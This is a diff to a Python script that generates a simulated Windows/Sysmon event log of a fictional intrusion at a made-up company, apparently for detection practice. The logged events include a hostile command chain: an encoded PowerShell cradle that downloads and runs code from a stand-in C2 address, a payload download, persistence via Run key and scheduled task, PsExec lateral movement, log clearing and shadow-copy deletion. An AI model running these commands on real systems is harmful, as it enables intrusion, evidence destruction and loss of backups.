@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-Generate sample_attack.jsonl: a fictional, simulated intrusion at "ACME Corp",
+Generate sample_attack.jsonl: a fictional, simulated intrusion at "Orvane Logistics",
 mixed with normal background noise. All hosts, users and IPs are made up
 (IPs come from the RFC 5737 documentation ranges).
 
 Scenario
-  DC-01   : password spraying against the domain controller
-  WS-042  : phishing doc -> macro -> encoded PowerShell -> payload download ->
+  ORV-DC01     : password spraying against the domain controller
+  ORV-LT-0117  : phishing doc -> macro -> encoded PowerShell -> payload download ->
             C2 -> discovery -> LSASS dump -> persistence -> lateral movement ->
             log wiping -> shadow copy deletion
 """
@@ -17,7 +17,7 @@ from datetime import datetime, timedelta, timezone
 
 random.seed(7)
 T0 = datetime(2026, 11, 20, 8, 55, tzinfo=timezone.utc)
-HOST, DC, USER = "WS-042.acme.local", "DC-01.acme.local", "ACME\\jdoe"
+HOST, DC, USER = "ORV-LT-0117.orvane.local", "ORV-DC01.orvane.local", "ORVANE\\d.levinson"
 C2 = "203.0.113.66"
 _guid = 0
 events = []
@@ -57,34 +57,34 @@ for i in range(25):
     add(s + 2, 3, Image=chrome["Image"], ProcessGuid=chrome["ProcessGuid"],
         DestinationIp=f"142.250.{random.randint(1, 250)}.{random.randint(1, 250)}", DestinationPort="443")
     proc(s + 30, SYS32 + "svchost.exe", "svchost.exe -k netsvcs -p", None, user="NT AUTHORITY\\SYSTEM")
-    add(s + 60, 4624, host=DC, TargetUserName=random.choice(["jdoe", "asmith", "mlevi"]),
+    add(s + 60, 4624, host=DC, TargetUserName=random.choice(["d.levinson", "m.peretz", "a.khoury"]),
         IpAddress=f"10.0.4.{random.randint(10, 60)}", LogonType="3")
-proc(400, SYS32 + "notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\todo.txt", explorer)
+proc(400, SYS32 + "notepad.exe", "notepad.exe C:\\Users\\d.levinson\\Documents\\todo.txt", explorer)
 proc(900, SYS32 + "ipconfig.exe", "ipconfig /all", explorer)
 add(1200, 13, Image=SYS32 + "svchost.exe", TargetObject="HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge\\Homepage",
-    Details="https://intranet.acme.local")
+    Details="https://intranet.orvane.local")
 
 # ----------------------------------------------- stage 0: password spraying (DC)
 for i in range(8):
-    add(300 + i * 6, 4625, host=DC, TargetUserName=random.choice(["admin", "administrator", "jdoe", "svc_backup"]),
+    add(300 + i * 6, 4625, host=DC, TargetUserName=random.choice(["admin", "administrator", "d.levinson", "svc_backup"]),
         IpAddress="198.51.100.23", LogonType="3", FailureReason="%%2313")
 
 # ------------------------------------------------------- stage 1: the phish
 A = 1500
 word = proc(A, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-            '"WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\Invoice_Nov2026.docm"', explorer)
+            '"WINWORD.EXE" /n "C:\\Users\\d.levinson\\Downloads\\Q4_Freight_Invoice_88213.docm"', explorer)
 payload = base64.b64encode(
     f"IEX (New-Object Net.WebClient).DownloadString('http://{C2}/stage2.ps1')".encode("utf-16le")).decode()
 ps = proc(A + 4, SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
           f"powershell.exe -nop -w hidden -enc {payload}", word)
 ps2 = proc(A + 6, SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
            f"powershell.exe -nop -c \"(New-Object Net.WebClient).DownloadFile('http://{C2}/upd.dll',"
-           f"'C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.dll')\"", ps)
+           f"'C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll')\"", ps)
 add(A + 7, 3, Image=ps2["Image"], ProcessGuid=ps2["ProcessGuid"], DestinationIp=C2, DestinationPort="80")
 add(A + 9, 11, Image=ps2["Image"], ProcessGuid=ps2["ProcessGuid"],
-    TargetFilename="C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.dll")
+    TargetFilename="C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll")
 implant = proc(A + 12, SYS32 + "rundll32.exe",
-               "rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.dll,Start", ps)
+               "rundll32.exe C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start", ps)
 add(A + 15, 3, Image=implant["Image"], ProcessGuid=implant["ProcessGuid"], DestinationIp=C2, DestinationPort="443")
 
 # ------------------------------------------------------ stage 2: discovery
@@ -101,18 +101,18 @@ add(A + 300, 10, SourceImage=implant["Image"], SourceProcessGuid=implant["Proces
 # --------------------------------------------------------- stage 4: persistence
 add(A + 420, 13, Image=implant["Image"], ProcessGuid=implant["ProcessGuid"],
     TargetObject="HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
-    Details="rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.dll,Start")
+    Details="rundll32.exe C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start")
 proc(A + 430, SYS32 + "schtasks.exe",
-     'schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "rundll32 C:\\Users\\jdoe\\AppData\\Local\\Temp\\upd.dll,Start" /sc onlogon',
+     'schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "rundll32 C:\\Users\\d.levinson\\AppData\\Local\\Temp\\upd.dll,Start" /sc onlogon',
      cmd)
 
 # -------------------------------------------------- stage 5: lateral movement
 proc(A + 900, "C:\\Users\\Public\\PsExec64.exe",
-     "PsExec64.exe \\\\FS-01 -u ACME\\svc_backup -s cmd.exe", cmd)
+     "PsExec64.exe \\\\ORV-FS02 -u ORVANE\\svc_backup -s cmd.exe", cmd)
 
 # ----------------------------------------------- stage 6: cover tracks + impact
 proc(A + 1500, SYS32 + "wevtutil.exe", "wevtutil cl Microsoft-Windows-Sysmon/Operational", cmd)
-add(A + 1502, 1102, SubjectUserName="jdoe", SubjectDomainName="ACME")
+add(A + 1502, 1102, SubjectUserName="d.levinson", SubjectDomainName="ORVANE")
 proc(A + 1560, SYS32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", cmd)
 
 if __name__ == "__main__":
